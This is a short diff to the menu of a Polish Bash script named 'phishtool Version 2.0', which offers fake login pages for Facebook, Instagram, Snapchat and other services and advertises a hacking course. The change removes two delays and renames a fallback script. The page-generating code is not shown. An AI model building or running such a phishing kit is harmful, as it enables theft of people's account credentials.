@@ -63,9 +63,7 @@ exit_work()
 echo " ------------------------------------------------------------------------------ "
 echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
 echo " ------------------------------------------------------------------------------ "
-sleep 2
 echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
-sleep 1
 echo "Wybierz opcje"
 echo "================="
 echo -e "\e[31m  [1] Facebook\e[0m"
@@ -91,7 +89,7 @@ case "$opcja" in
   "5") instagram_login_page ;;
   "6") snapchat_login_page ;;
   "11") exit_work ;;
-  *)  ./run2.sh
+  *)  ./run.sh
   
 esac
 
